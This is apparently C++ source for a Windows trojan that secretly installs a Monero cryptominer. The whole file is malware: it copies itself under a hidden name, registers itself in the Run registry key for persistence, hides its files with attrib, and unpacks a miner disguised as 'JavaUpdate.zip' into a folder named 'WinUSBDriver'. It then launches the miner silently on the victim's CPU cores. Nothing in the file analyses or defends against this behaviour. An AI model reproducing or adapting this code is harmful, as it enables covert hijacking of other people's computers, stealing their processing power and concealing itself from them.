#include <string.h>
#include <strings.h>
#include <string>
#include <math.h>
#include <windows.h>
#include <tlhelp32.h>
#include <commctrl.h>
#include <Shlwapi.h>
#include <shellapi.h>
#include <Shlobj.h>
#include <stdlib.h>
#include "Utils.h"

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char szEmail[256] = "test@gmail.com";

    char szFileName[MAX_PATH+1];
    GetModuleFileNameA(NULL, szFileName, MAX_PATH);

    char szMinerEXEPath[MAX_PATH+1];
    GetTempPathA(MAX_PATH, szMinerEXEPath);
    strcat(szMinerEXEPath, "..\\WinUSBDriver\\nrvv.exe");

    char szDroppedTrojPath[MAX_PATH+1];
    GetTempPathA(MAX_PATH, szDroppedTrojPath);
    strcat(szDroppedTrojPath, "..\\nrvv.exe");

    char szDataPath[MAX_PATH+1];
    GetTempPathA(MAX_PATH, szDataPath);
    strcat(szDataPath, "..\\JavaUpdate.zip");

    char szMinerFilesPath[MAX_PATH+1];
    GetTempPathA(MAX_PATH, szMinerFilesPath);
    strcat(szMinerFilesPath, "..\\WinUSBDriver");

    if(!(strstr(szFileName, "nrvv") > 0))
    {
        CopyFileA(szFileName, szDroppedTrojPath, FALSE);

        HKEY hKey = 0;

        RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
        RegSetValueEx(hKey, "nrvv", 0, REG_SZ, (PBYTE)szDroppedTrojPath, strlen(szDroppedTrojPath) + 1);
        RegCloseKey(hKey);

        char szAttrOpt[256+1];
        strcpy(szAttrOpt, "+h +S +R \"");
        strncat(szAttrOpt, szDroppedTrojPath, 256);
        strncat(szAttrOpt, "\"", 256);

        ShellExecuteA(NULL, "open", "attrib", szAttrOpt, NULL, SW_HIDE);

        ShellExecuteA(NULL, "open", szDroppedTrojPath, NULL, NULL, SW_HIDE);

        ExitProcess(0);
    }

    if(InternetCheckConnection("http://www.google.com", 1, 0)==0)
    {
        ExitProcess(1);
    }

    Utils utils;

    char szDataDeleteCmdOpt[256] = "\"";
    strcat(szDataDeleteCmdOpt, szDataPath);
    strcat(szDataDeleteCmdOpt, "\"");

    if(!PathFileExists(szMinerEXEPath))
    {
        if(!PathFileExists(szDataPath))
        {
            while(true)
            {
                utils.DropMiner(szDataPath);

                if(utils.unpack(szDataPath, szMinerFilesPath) == 0)
                    break;

                DeleteFileA(szDataPath);
            }
        }
        DeleteFileA(szDataPath);
    }

    char szAttrOpt[256+1];
    strcpy(szAttrOpt, "+h +S +R /S \"");
    strncat(szAttrOpt, szMinerFilesPath, 256);
    strncat(szAttrOpt, "\"", 256);

    ShellExecuteA(NULL, "open", "ATTRIB", szAttrOpt, NULL, SW_HIDE);


    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);

    int nCPUCores = sysinfo.dwNumberOfProcessors;

    if(nCPUCores != 1)
        nCPUCores = trunc(nCPUCores/100 * 50);

    char sznCPUCores[10];
    itoa(nCPUCores, sznCPUCores, 10);

    char szMinerOpt[256] = "-user \"";
    strcat(szMinerOpt, szEmail);
    strcat(szMinerOpt, "\" -xmr ");
    strcat(szMinerOpt, sznCPUCores);
    strcat(szMinerOpt, " 10");

	ShellExecuteA(NULL, "open", szMinerEXEPath, szMinerOpt, NULL, SW_HIDE);

    ExitProcess(0);
}
